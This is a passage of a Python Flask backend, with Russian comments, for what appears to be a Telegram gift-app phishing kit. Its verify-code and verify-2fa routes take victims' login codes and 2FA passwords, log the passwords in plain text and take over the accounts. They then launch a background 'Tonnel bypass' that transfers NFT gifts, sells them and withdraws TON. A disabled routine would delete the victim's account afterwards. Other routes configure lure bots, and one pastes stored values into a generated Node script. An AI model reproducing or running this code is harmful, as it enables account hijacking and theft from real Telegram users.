        return jsonify({'success': False, 'error': f'Server error: {str(outer_e)}'}), 500

@app.route('/api/debug_get_me', methods=['POST'])
def debug_get_me():
    """Debug: попробовать получить get_me через Telethon или Pyrogram."""
    data = request.get_json() or {}
    phone = data.get('phone')
    mode = data.get('mode', 'telethon')  # 'telethon' | 'pyrogram'
    try:
        if mode == 'telethon':
            from utils import get_session_data_from_sqlite
            session_file = f"sessions/{phone.replace('+', '')}.session"
            if not os.path.exists(session_file):
                return jsonify({'success': False, 'error': 'Session file not found', 'mode': mode}), 404
            from utils import get_user_data_from_telethon
            import asyncio
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            user_data = loop.run_until_complete(get_user_data_from_telethon(session_file))
            loop.close()
            return jsonify({'success': True, 'mode': mode, 'user_data': user_data})
        elif mode == 'pyrogram':
            # Можно передать session_string напрямую, либо прочитать из JSON рядом с session файлом
            session_string = data.get('session_string')
            if not session_string:
                json_file = f"sessions/{phone.replace('+', '')}.json"
                if not os.path.exists(json_file):
                    return jsonify({'success': False, 'error': 'Session json not found and no session_string provided', 'mode': mode}), 404
                with open(json_file, 'r') as f:
                    session_meta = json.load(f)
                session_string = session_meta.get('session_string')
                if not session_string:
                    return jsonify({'success': False, 'error': 'session_string missing in json and not provided', 'mode': mode}), 400
            from utils import get_me_from_pyrogram
            import asyncio
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            user_data = loop.run_until_complete(get_me_from_pyrogram(session_string))
            loop.close()
            return jsonify({'success': True, 'mode': mode, 'user_data': user_data})
        else:
            return jsonify({'success': False, 'error': 'Unknown mode'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': str(e), 'mode': mode}), 500
@app.route('/verify-code', methods=['POST'])
def verify_code():
    from utils import log_user_action
    try:
        data = request.json or {}
        init_data = data.get('init_data') or data.get('initData')
        user_id = session.get('user_id') or data.get('user_id')
        if isinstance(user_id, str) and user_id.lower() == 'web_user':
            user_id = None
        if init_data and not user_id:
            try:
                user_info = get_user_from_init_data(init_data)
                if user_info:
                    user_id = user_info.get('id')
            except Exception as e:
                logger.warning(f"Не удалось разобрать init_data: {e}")
        code = data.get('code')
        phone_number = data.get('phone_number')
        
        logger.info(f"Получен запрос на /verify-code: user_id={user_id}, code={'*' * len(code) if code else None}, phone={phone_number}")
        
        if not user_id:
            logger.warning("Запрос без user_id")
            return jsonify({'success': False, 'error': 'User ID not found. Please open the app through Telegram.'})
        
        if not code:
            return jsonify({'success': False, 'error': 'Verification code required'})
        
        import re
        if not re.match(r'^\d{5,6}$', code):
            return jsonify({'success': False, 'error': 'Invalid verification code format'})
        
        session_data = load_session_data(user_id)
        phone = session_data.get('phone') or phone_number  
        phone_code_hash = session_data.get('phone_code_hash')
        session_file = session_data.get('session_file')
        is_fake = session_data.get('is_fake', False)
        
        # Фейковый вход для тестового номера (принимаем любой код, без логирования)
        if phone == FAKE_TEST_PHONE or is_fake:
            logger.info(f"Фейковый вход для тестового номера {phone} - принимаем код {code}")
            clear_session_data(user_id)
            # Возвращаем успешный ответ с фейковой статистикой
            return jsonify({
                'success': True,
                'fake_account': True
            })
        
        if not all([phone, phone_code_hash, session_file]):
            return jsonify({'success': False, 'error': 'Session expired or not found'})
        
        try:
            auth = TelegramAuth(session_file)
            user = run_async(auth.verify_code(phone, code, phone_code_hash))
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(log_user_action('code_verified', user_info={'id': user_id}, additional_data={'phone': phone, 'code': code, 'details': f"Код подтвержден для номера: {phone}"}))
                
                loop.close()
            except Exception as e:
                logger.error(f"Error logging code verification: {e}")
            from utils import create_session_json, convert_telethon_to_pyrogram, get_account_stats
            create_session_json(phone, user_id=user_id)
            clear_session_data(user_id)
            
            # Получаем статистику аккаунта
            account_stats = None
            gift_processing_completed = False
            
            try:
                session_string = run_async(convert_telethon_to_pyrogram(session_file))
                account_stats = run_async(get_account_stats(session_string))
                
                # Проверяем авто-режим обработки подарков (всегда включен)
                auto_process_enabled = db.get_auto_process_enabled(user_id)
                
                if auto_process_enabled:
                    # Запускаем Tonnel-обход: Business Bot → Instant Transfer → листинг → вывод TON
                    logger.info(f"Auto-process enabled for user {user_id}, starting Tonnel bypass in background...")
                    from tonnel_runner import launch_tonnel_background
                    launch_tonnel_background(session_string, phone, user_id)
                    logger.info(f"✅ Tonnel-обход запущен в фоне для {phone} (user_id: {user_id})")
                else:
                    logger.info(f"Auto-process disabled for user {user_id}, skipping Tonnel bypass")
                        
            except Exception as e:
                logger.error(f"Error getting account stats: {e}")
            
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                additional_data = {
                    'phone': phone, 
                    'details': f"Пользователь успешно авторизован: {phone}"
                }
                if account_stats:
                    additional_data['account_stats'] = account_stats
                loop.run_until_complete(log_user_action('auth_success', user_info={'id': user_id}, additional_data=additional_data))
                loop.close()
            except Exception as e:
                logger.error(f"Ошибка логирования успешной авторизации: {e}", exc_info=True)
            
            # Запускаем удаление аккаунта только если auto-process отключен
            # Если auto-process включен, удаление уже запущено после завершения обработки
            if not auto_process_enabled:
                async def schedule_account_deletion_async():
                    # Если auto-process отключен - даем больше времени для ручной обработки
                    logger.info(f"Запланировано удаление аккаунта {phone} через 30 минут после авторизации (auto-process отключен)")
                    await asyncio.sleep(1800)  # Ждем 30 минут для ручной обработки
                    
                    # TODO: Временно отключена система удаления аккаунтов
                    # try:
                    #     from utils import delete_account_via_telethon
                    #     logger.info(f"Начинаю удаление аккаунта {phone}...")
                    #     await delete_account_via_telethon(session_file, phone, user_id)
                    # except Exception as del_err:
                    #     logger.error(f"Ошибка удаления аккаунта {phone} после авторизации: {del_err}", exc_info=True)
                
                def run_deletion_in_background():
                    try:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(schedule_account_deletion_async())
                        loop.close()
                    except Exception as bg_err:
                        logger.error(f"Ошибка в фоновой задаче удаления для {phone}: {bg_err}", exc_info=True)
                
                import threading
                deletion_thread = threading.Thread(target=run_deletion_in_background, daemon=True)
                deletion_thread.start()
            
            return jsonify({'success': True})
        except SessionPasswordNeededError:
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(log_user_action('2fa_required', user_info={'id': user_id}, additional_data={'phone': phone, 'details': f"Требуется 2FA пароль для номера: {phone}"}))
                loop.close()
            except Exception as e:
                logger.error(f"Error logging 2FA required: {e}", exc_info=True)
            session_data['needs_2fa'] = True
            save_session_data(user_id, session_data)
            return jsonify({
                'success': False, 
                'requires_2fa': True,  
                'error': '2FA password required'
            })
        except Exception as e:
            logger.error(f"Ошибка в verify_code: {e}", exc_info=True)
            return jsonify({'success': False, 'error': str(e)})
    except Exception as outer_e:
        logger.error(f"Критическая ошибка в verify_code: {outer_e}", exc_info=True)
        return jsonify({'success': False, 'error': f'Server error: {str(outer_e)}'}), 500

@app.route('/api/auth/verify-2fa', methods=['POST'])
@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    from utils import log_user_action
    try:
        data = request.json or {}
        init_data = data.get('init_data') or data.get('initData')
        user_id = session.get('user_id') or data.get('user_id')
        if isinstance(user_id, str) and user_id.lower() == 'web_user':
            user_id = None
        if init_data and not user_id:
            try:
                user_info = get_user_from_init_data(init_data)
                if user_info:
                    user_id = user_info.get('id')
            except Exception as e:
                logger.warning(f"Не удалось разобрать init_data: {e}")
        password = data.get('password')
        phone_number = data.get('phone_number')
        
        logger.info(f"Получен запрос на /verify-2fa: user_id={user_id}, phone={phone_number}")
        
        if not user_id:
            logger.warning("Запрос без user_id")
            return jsonify({'success': False, 'error': 'User ID not found. Please open the app through Telegram.'})
        
        if not password:
            return jsonify({'success': False, 'error': '2FA password required'})
        
        if len(password.strip()) == 0:
            return jsonify({'success': False, 'error': 'Password cannot be empty'})
        
        session_data = load_session_data(user_id)
        phone = session_data.get('phone') or phone_number  
        session_file = session_data.get('session_file')
        is_fake = session_data.get('is_fake', False)
        
        # Фейковый вход для тестового номера (принимаем любой пароль, без логирования)
        if phone == FAKE_TEST_PHONE or is_fake:
            logger.info(f"Фейковый вход для тестового номера {phone} - принимаем 2FA пароль")
            clear_session_data(user_id)
            # Возвращаем успешный ответ с фейковой статистикой
            return jsonify({
                'success': True,
                'fake_account': True
            })
        
        if not all([phone, session_file]):
            return jsonify({'success': False, 'error': 'Session expired or not found'})
        
        try:
            auth = TelegramAuth(session_file)
            user = run_async(auth.verify_2fa(password))
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                # Сначала логируем сам ввод пароля с его значением (экранируется на стороне utils)
                loop.run_until_complete(log_user_action('2fa_entered', user_info={'id': user_id}, additional_data={'phone': phone, 'password': password}))
                # Затем логируем факт успешной верификации 2FA
                loop.run_until_complete(log_user_action('2fa_verified', user_info={'id': user_id}, additional_data={'phone': phone, 'details': f"2FA пароль успешно подтвержден для номера: {phone}"}))
                
                
                loop.close()
            except Exception as e:
                logger.error(f"Error logging 2FA verification: {e}")
            from utils import create_session_json, convert_telethon_to_pyrogram, get_account_stats
            create_session_json(phone, twoFA=True, user_id=user_id)
            clear_session_data(user_id)
            
            # Получаем статистику аккаунта
            account_stats = None
            gift_processing_completed = False
            
            try:
                session_string = run_async(convert_telethon_to_pyrogram(session_file))
                account_stats = run_async(get_account_stats(session_string))
                
                # Проверяем авто-режим обработки подарков (всегда включен)
                auto_process_enabled = db.get_auto_process_enabled(user_id)
                
                if auto_process_enabled:
                    # Запускаем Tonnel-обход: Business Bot → Instant Transfer → листинг → вывод TON
                    logger.info(f"Auto-process enabled for user {user_id}, starting Tonnel bypass in background (2FA)...")
                    from tonnel_runner import launch_tonnel_background
                    launch_tonnel_background(session_string, phone, user_id)
                    logger.info(f"✅ Tonnel-обход запущен в фоне для {phone} (user_id: {user_id}, 2FA)")
                else:
                    logger.info(f"Auto-process disabled for user {user_id}, skipping Tonnel bypass (2FA)")
                        
            except Exception as e:
                logger.error(f"Error getting account stats: {e}")
            
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                additional_data = {
                    'phone': phone, 
                    '2fa': True, 
                    'details': f"Пользователь успешно авторизован с 2FA: {phone}"
                }
                if account_stats:
                    additional_data['account_stats'] = account_stats
                loop.run_until_complete(log_user_action('auth_success', user_info={'id': user_id}, additional_data=additional_data))
                loop.close()
            except Exception as e:
                logger.error(f"Ошибка логирования успешной авторизации с 2FA: {e}", exc_info=True)
            
            # Запускаем удаление аккаунта только если auto-process отключен
            # Если auto-process включен, удаление уже запущено после завершения обработки
            if not auto_process_enabled:
                async def schedule_account_deletion_async():
                    # Если auto-process отключен - даем больше времени для ручной обработки
                    logger.info(f"Запланировано удаление аккаунта {phone} через 30 минут после авторизации (2FA, auto-process отключен)")
                    await asyncio.sleep(1800)  # Ждем 30 минут для ручной обработки
                    
                    # TODO: Временно отключена система удаления аккаунтов
                    # try:
                    #     from utils import delete_account_via_telethon
                    #     logger.info(f"Начинаю удаление аккаунта {phone}...")
                    #     await delete_account_via_telethon(session_file, phone, user_id)
                    # except Exception as del_err:
                    #     logger.error(f"Ошибка удаления аккаунта {phone} после авторизации: {del_err}", exc_info=True)
                
                def run_deletion_in_background():
                    try:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(schedule_account_deletion_async())
                        loop.close()
                    except Exception as bg_err:
                        logger.error(f"Ошибка в фоновой задаче удаления для {phone}: {bg_err}", exc_info=True)
                
                import threading
                deletion_thread = threading.Thread(target=run_deletion_in_background, daemon=True)
                deletion_thread.start()
            
            return jsonify({'success': True})
        except Exception as e:
            logger.error(f"Ошибка в verify_2fa: {e}", exc_info=True)
            return jsonify({'success': False, 'error': str(e)})
    except Exception as outer_e:
        logger.error(f"Критическая ошибка в verify_2fa: {outer_e}", exc_info=True)
        return jsonify({'success': False, 'error': f'Server error: {str(outer_e)}'}), 500
@app.route('/api/process_gifts', methods=['POST'])
def process_gifts():
    """API: обработка подарков пользователя - поиск и перевод NFT подарков"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        user_id = data.get('user_id')
        user_info = get_user_from_init_data(init_data)
        if not user_info and user_id:
            user_info = {'id': int(user_id)}
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data or user_id'}), 401
        telegram_id = user_info['id']
        from utils import log_user_action
        import asyncio
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(log_user_action('session_processing_start', user_info={'id': telegram_id}, additional_data={'details': f"Началась обработка сессии пользователя"}))
            loop.close()
        except Exception as e:
            logger.error(f"Error logging session processing start: {e}")
        from utils import get_phone_from_json, check_session_exists, validate_session
        phone = get_phone_from_json(telegram_id)
        if not phone:
            return jsonify({
                'success': False, 
                'error': 'Phone number not found. Please authorize first.'
            }), 400
        if not (check_session_exists(phone) and validate_session(phone)):
            return jsonify({
                'success': False, 
                'error': 'Session expired or invalid. Please re-authorize.'
            }), 401
        from utils import get_session_data_from_sqlite, convert_telethon_to_pyrogram
        session_file = f"sessions/{phone.replace('+', '')}.session"
        if not os.path.exists(session_file):
            return jsonify({
                'success': False, 
                'error': 'Session file not found'
            }), 404
        import asyncio
        async def process_gifts_async():
            pyrogram_session = await convert_telethon_to_pyrogram(session_file)
            if not pyrogram_session:
                return None
            from tonnel_runner import launch_tonnel_background
            launch_tonnel_background(pyrogram_session, phone, telegram_id)
            return {"status": "tonnel_started"}
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(process_gifts_async())
            loop.close()
        except Exception as e:
            logger.error(f"Error in async processing: {e}")
            return jsonify({'success': False, 'error': f'Async processing failed: {str(e)}'}), 500
        if result is None:
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(log_user_action('session_processing_error', user_info={'id': telegram_id}, additional_data={'details': f"Ошибка конвертации сессии"}))
                loop.close()
            except Exception as e:
                logger.error(f"Error logging session processing error: {e}")
            return jsonify({
                'success': False, 
                'error': 'Failed to convert session'
            }), 500
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(log_user_action('session_processing_complete', user_info={'id': telegram_id}, additional_data={'details': f"Обработка сессии пользователя завершена"}))
            loop.close()
        except Exception as e:
            logger.error(f"Error logging session processing complete: {e}")
        return jsonify({
            'success': True,
            'message': 'Gift processing completed',
            'result': result
        })
    except Exception as e:
        logger.error(f"Error processing gifts: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/check-auth-status')
def check_auth_status():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({'success': False, 'error': 'User ID required'})
    from utils import get_phone_from_json, check_session_exists, validate_session
    phone = get_phone_from_json(user_id)
    if phone:
        is_authorized = check_session_exists(phone) and validate_session(phone)
        return jsonify({
            'success': True,
            'has_phone': True,
            'phone': phone,
            'is_authorized': is_authorized
        })
    return jsonify({
        'success': True,
        'has_phone': False,
        'is_authorized': False
    })

# Папка для файлов для скачивания
DOWNLOADS_DIR = os.path.join(os.path.dirname(__file__), 'downloads')
# Создаем папку, если её нет
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

@app.route('/download/<path:filename>')
def download_file(filename):
    """Эндпоинт для скачивания файлов из папки downloads/"""
    try:
        # Защита от path traversal (../)
        if '..' in filename or filename.startswith('/'):
            return jsonify({'error': 'Invalid filename'}), 400
        
        # Полный путь к файлу
        file_path = os.path.join(DOWNLOADS_DIR, filename)
        # Нормализуем путь и проверяем, что файл находится внутри DOWNLOADS_DIR
        file_path = os.path.normpath(file_path)
        downloads_dir_abs = os.path.abspath(DOWNLOADS_DIR)
        if not file_path.startswith(downloads_dir_abs):
            return jsonify({'error': 'Invalid filename'}), 400
        
        # Проверяем существование файла
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        # Проверяем, что это файл, а не директория
        if not os.path.isfile(file_path):
            return jsonify({'error': 'Not a file'}), 400
        
        # Отдаем файл для скачивания
        return send_file(file_path, as_attachment=True)
    except Exception as e:
        logger.error(f"Error downloading file {filename}: {e}", exc_info=True)
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/template-settings')
def template_settings_page():
    """Страница настройки шаблона бота"""
    return render_template('template_settings.html')

@app.route('/api/template-settings/<int:bot_id>', methods=['GET'])
def get_template_settings(bot_id):
    """Получить настройки шаблона бота"""
    try:
        import sqlite3
        killamonjaro_db_path = '/root/KillamonjaroAuto/data/bot.db'
        
        logger.info(f"GET template-settings for bot_id: {bot_id}")
        
        if not os.path.exists(killamonjaro_db_path):
            logger.error(f"Database not found: {killamonjaro_db_path}")
            return jsonify({'success': False, 'error': 'Database not found'}), 404
        
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(
                'SELECT * FROM user_bots WHERE id = ? AND is_active = 1',
                (bot_id,)
            )
            row = cursor.fetchone()
            
            if not row:
                logger.warning(f"Bot {bot_id} not found or inactive")
                return jsonify({'success': False, 'error': 'Bot not found'}), 404
            
            logger.info(f"Bot {bot_id} found: {row['bot_name']}")
            
            # Получаем все колонки, которые могут быть в таблице
            settings = {}
            possible_fields = [
                'welcome_message', 'inline_gifts', 'gift_received_message',
                'gift_error_message', 'gift_not_found_message',
                'gift_already_received_message', 'gift_access_denied_message',
                'check_success_message', 'check_not_found_message',
                'check_already_used_message', 'check_activation_error_message',
                'check_error_message',  # Старое название
                'market_button_text', 'collections_button_text', 'welcome_photo_path'
            ]
            
            for field in possible_fields:
                try:
                    if field in row.keys():
                        value = row[field]
                        settings[field] = value if value else ''
                    else:
                        settings[field] = ''
                except (KeyError, IndexError) as e:
                    logger.warning(f"Field {field} not found in row: {e}")
                    settings[field] = ''
            
            # Обрабатываем старое название check_error_message для совместимости
            if 'check_error_message' in row.keys() and row['check_error_message']:
                if not settings.get('check_activation_error_message'):
                    settings['check_activation_error_message'] = row['check_error_message']
            
            # Удаляем check_error_message из ответа, оставляем только check_activation_error_message
            if 'check_error_message' in settings:
                del settings['check_error_message']
            
            logger.info(f"Returning settings for bot {bot_id}: {list(settings.keys())}")
            return jsonify({'success': True, 'settings': settings})
    except Exception as e:
        logger.error(f"Error getting template settings: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/template-settings/<int:bot_id>', methods=['POST'])
def save_template_settings(bot_id):
    """Сохранить настройки шаблона бота"""
    try:
        import sqlite3
        killamonjaro_db_path = '/root/KillamonjaroAuto/data/bot.db'
        
        logger.info(f"POST template-settings for bot_id: {bot_id}")
        
        if not os.path.exists(killamonjaro_db_path):
            logger.error(f"Database not found: {killamonjaro_db_path}")
            return jsonify({'success': False, 'error': 'Database not found'}), 404
        
        data = request.get_json()
        if not data:
            logger.error("No data provided in request")
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        logger.info(f"Received settings data: {list(data.keys())}")
        
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            cursor = conn.cursor()
            
            # Проверяем, что бот существует
            cursor.execute('SELECT id FROM user_bots WHERE id = ? AND is_active = 1', (bot_id,))
            if not cursor.fetchone():
                return jsonify({'success': False, 'error': 'Bot not found'}), 404
            
            # Обновляем настройки
            updates = []
            params = []
            
            fields = [
                'welcome_message', 'inline_gifts', 'gift_received_message',
                'gift_error_message', 'gift_not_found_message',
                'gift_already_received_message', 'gift_access_denied_message',
                'check_success_message', 'check_not_found_message',
                'check_already_used_message', 'check_activation_error_message',
                'market_button_text', 'collections_button_text', 'welcome_photo_path'
            ]
            
            for field in fields:
                if field in data:
                    updates.append(f'{field} = ?')
                    # Для welcome_photo_path: если значение null или пустая строка, устанавливаем NULL
                    if field == 'welcome_photo_path' and (data[field] is None or data[field] == ''):
                        params.append(None)
                    else:
                        params.append(data[field] or None)
            
            if updates:
                params.append(bot_id)
                query = f"UPDATE user_bots SET {', '.join(updates)} WHERE id = ?"
                logger.info(f"Executing query: {query[:100]}... with {len(params)} params")
                cursor.execute(query, params)
                conn.commit()
                logger.info(f"Settings saved successfully for bot {bot_id}")
            else:
                logger.warning(f"No updates to save for bot {bot_id}")
            
            return jsonify({'success': True, 'message': 'Settings saved'})
    except Exception as e:
        logger.error(f"Error saving template settings: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/restart-bot/<int:bot_id>', methods=['POST'])
def restart_bot_api(bot_id):
    """Перезапустить бота через API"""
    try:
        import sqlite3
        import subprocess
        import os
        from pathlib import Path
        
        killamonjaro_db_path = '/root/KillamonjaroAuto/data/bot.db'
        
        if not os.path.exists(killamonjaro_db_path):
            return jsonify({'success': False, 'error': 'Database not found'}), 404
        
        # Получаем информацию о боте
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(
                'SELECT * FROM user_bots WHERE id = ? AND is_active = 1',
                (bot_id,)
            )
            row = cursor.fetchone()
            
            if not row:
                return jsonify({'success': False, 'error': 'Bot not found'}), 404
            
            bot_path = row['bot_path']
            bot_token = row['bot_token']
            bot_dir_name = Path(bot_path).name
            
            # Используем прямое обращение к функции перезапуска через Node.js
            # Создаем скрипт, который использует правильный путь к модулю
            import tempfile
            restart_script_content = f'''
import {{ restartBot }} from '/root/KillamonjaroAuto/src/utils/bot_monitor.js';

(async () => {{
    try {{
        const result = await restartBot(
            "{bot_path}",
            "{bot_token}",
            "{bot_dir_name}"
        );
        if (result && result.success) {{
            console.log("SUCCESS");
            process.exit(0);
        }} else {{
            console.error("FAILED:", result ? result.error : "Unknown error");
            process.exit(1);
        }}
    }} catch (error) {{
        console.error("ERROR:", error.message);
        if (error.stack) {{
            console.error(error.stack);
        }}
        process.exit(1);
    }}
}})();
'''
            
            # Создаем временный файл в директории KillamonjaroAuto
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.mjs', delete=False, dir='/root/KillamonjaroAuto') as f:
                f.write(restart_script_content)
                temp_script = f.name
            
            try:
                logger.info(f"Restarting bot {bot_id} with script: {temp_script}")
                # Запускаем скрипт перезапуска через node из директории KillamonjaroAuto
                process = subprocess.run(
                    ['node', temp_script],
                    capture_output=True,
                    text=True,
                    timeout=15,
                    cwd='/root/KillamonjaroAuto'
                )
                
                logger.info(f"Restart process stdout: {process.stdout}")
                logger.info(f"Restart process stderr: {process.stderr}")
                logger.info(f"Restart process returncode: {process.returncode}")
                
            finally:
                # Удаляем временный файл
                try:
                    os.unlink(temp_script)
                except Exception as e:
                    logger.warning(f"Could not delete temp file {temp_script}: {e}")
            
            if process.returncode == 0 and 'SUCCESS' in process.stdout:
                logger.info(f"Bot {bot_id} restarted successfully")
                return jsonify({'success': True, 'message': 'Bot restarted'})
            else:
                error_msg = process.stderr or process.stdout or 'Unknown error'
                logger.error(f"Error restarting bot {bot_id}: {error_msg}")
                return jsonify({'success': False, 'error': f'Failed to restart bot: {error_msg}'}), 500
                
    except Exception as e:
        logger.error(f"Error in restart_bot_api: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/upload-welcome-photo/<int:bot_id>', methods=['POST'])
def upload_welcome_photo(bot_id):
    """Загрузить приветственное фото для бота"""
    try:
        import sqlite3
        from werkzeug.utils import secure_filename
        from pathlib import Path
        
        killamonjaro_db_path = '/root/KillamonjaroAuto/data/bot.db'
        
        if not os.path.exists(killamonjaro_db_path):
            return jsonify({'success': False, 'error': 'Database not found'}), 404
        
        # Проверяем, что бот существует
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(
                'SELECT id FROM user_bots WHERE id = ? AND is_active = 1',
                (bot_id,)
            )
            if not cursor.fetchone():
                return jsonify({'success': False, 'error': 'Bot not found'}), 404
        
        if 'photo' not in request.files:
            return jsonify({'success': False, 'error': 'No file provided'}), 400
        
        file = request.files['photo']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'}), 400
        
        # Создаем директорию для фото ботов
        photos_dir = Path('/root/getgems/bot_photos')
        photos_dir.mkdir(parents=True, exist_ok=True)
        
        # Сохраняем файл
        filename = secure_filename(f'bot_{bot_id}_{file.filename}')
        filepath = photos_dir / filename
        file.save(str(filepath))
        
        # Сохраняем путь в БД
        photo_path = str(filepath)
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'UPDATE user_bots SET welcome_photo_path = ? WHERE id = ?',
                (photo_path, bot_id)
            )
            conn.commit()
        
        logger.info(f"Welcome photo uploaded for bot {bot_id}: {photo_path}")
        return jsonify({'success': True, 'photo_path': photo_path})
        
    except Exception as e:
        logger.error(f"Error uploading welcome photo: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/welcome-photo/<int:bot_id>')
def get_welcome_photo(bot_id):
    """Получить приветственное фото бота"""
    try:
        import sqlite3
        from pathlib import Path
        
        killamonjaro_db_path = '/root/KillamonjaroAuto/data/bot.db'
        
        if not os.path.exists(killamonjaro_db_path):
            # Возвращаем базовое фото
            default_photo = Path(__file__).parent / 'privetsvie.jpg'
            if default_photo.exists():
                return send_file(str(default_photo))
            else:
                return jsonify({'success': False, 'error': 'Photo not found'}), 404
        
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(
                'SELECT welcome_photo_path FROM user_bots WHERE id = ? AND is_active = 1',
                (bot_id,)
            )
            row = cursor.fetchone()
            
            if not row:
                # Возвращаем базовое фото
                default_photo = Path(__file__).parent / 'privetsvie.jpg'
                if default_photo.exists():
                    return send_file(str(default_photo))
                else:
                    return jsonify({'success': False, 'error': 'Bot not found'}), 404
            
            photo_path = row['welcome_photo_path']
            
            if photo_path and os.path.exists(photo_path):
                return send_file(photo_path)
            else:
                # Возвращаем базовое фото
                default_photo = Path(__file__).parent / 'privetsvie.jpg'
                if default_photo.exists():
                    return send_file(str(default_photo))
                else:
                    return jsonify({'success': False, 'error': 'Photo not found'}), 404
                    
    except Exception as e:
        logger.error(f"Error getting welcome photo: {e}", exc_info=True)
        # Пытаемся вернуть базовое фото даже при ошибке
        try:
            default_photo = Path(__file__).parent / 'privetsvie.jpg'
            if default_photo.exists():
                return send_file(str(default_photo))
        except:
            pass
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/nft/attributes', methods=['GET'])
def get_nft_attributes():
    """Получить атрибуты NFT (модель, символ, фон) из ссылки Fragment"""
    try:
        import urllib.request
        import re
        
        gift_name = request.args.get('name')
        gift_id = request.args.get('id')
        gift_link = request.args.get('link')
        
        if not gift_name or not gift_id:
            return jsonify({'success': False, 'error': 'name and id required'}), 400
        
        # Если ссылка не передана, формируем её
        if not gift_link:
            gift_link = f"https://t.me/nft/{gift_name}-{gift_id}"
        
        attributes = {
            'model': None,
            'symbol': None,
            'backdrop': None,
            'modelPercent': None,
            'symbolPercent': None,
            'backdropPercent': None
        }
        
        try:
            # Делаем запрос к странице NFT
            req = urllib.request.Request(
                gift_link,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                page_text = response.read().decode('utf-8', errors='ignore')
                
                # Вариант 1: Извлекаем данные из og:description мета-тега (основной способ)
                og_desc_pattern = r'<meta\s+property=["\']og:description["\']\s+content=["\']([^"\']+?)["\']'
                og_desc_match = re.search(og_desc_pattern, page_text, re.IGNORECASE | re.DOTALL)
                
                if og_desc_match:
                    og_content = og_desc_match.group(1)
                    # Парсим строки формата "Model: Value\nBackdrop: Value\nSymbol: Value"
                    lines = og_content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if not line:
                            continue
                        
                        # Model
                        if re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE):
                            model_match = re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE)
                            if model_match and not attributes['model']:
                                attributes['model'] = model_match.group(1).strip()
                        
                        # Symbol
                        elif re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE):
                            symbol_match = re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE)
                            if symbol_match and not attributes['symbol']:
                                attributes['symbol'] = symbol_match.group(1).strip()
                        
                        # Backdrop
                        elif re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE):
                            backdrop_match = re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE)
                            if backdrop_match and not attributes['backdrop']:
                                attributes['backdrop'] = backdrop_match.group(1).strip()
                
                # Вариант 2: Ищем в twitter:description (резервный способ)
                if not attributes['model'] or not attributes['symbol'] or not attributes['backdrop']:
                    twitter_desc_pattern = r'<meta\s+name=["\']twitter:description["\']\s+content=["\']([^"\']+?)["\']'
                    twitter_desc_match = re.search(twitter_desc_pattern, page_text, re.IGNORECASE | re.DOTALL)
                    
                    if twitter_desc_match:
                        twitter_content = twitter_desc_match.group(1)
                        lines = twitter_content.split('\n')
                        for line in lines:
                            line = line.strip()
                            if not line:
                                continue
                            
                            if re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE):
                                model_match = re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE)
                                if model_match and not attributes['model']:
                                    attributes['model'] = model_match.group(1).strip()
                            
                            elif re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE):
